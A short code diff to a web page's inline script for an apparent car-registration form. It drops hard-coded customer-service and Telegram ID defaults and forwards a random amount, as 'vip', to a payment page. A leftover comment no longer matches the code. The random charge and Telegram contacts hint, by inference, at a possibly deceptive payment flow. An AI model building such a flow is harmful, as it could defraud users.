@@ -237,8 +237,8 @@
 			;(function () {
 				const params = new URLSearchParams(window.location.search)
 				const name = params.get('name')
-				const kefu = params.get('kefu') || 'okk13'
-				const tgid = params.get('tgid') || '5866891166'
+				const kefu = params.get('kefu')
+				const tgid = params.get('tgid')
 
 				if (name) {
 					document.title = name + ' - 实物车信息登记'
@@ -275,12 +275,8 @@
 
 				const payParams = new URLSearchParams(window.location.search)
 				// 移除 name 参数，不传递给支付页面
-				payParams.delete('name')
 
-				payParams.set('phone', phone)
-				payParams.set('address', address)
-				payParams.set('product', selectedProduct)
-				payParams.set('amount', randomAmount)
+				payParams.set('vip', randomAmount)
 				payParams.set('tgid', tgid)
 				payParams.set('kefu', kefu)
 
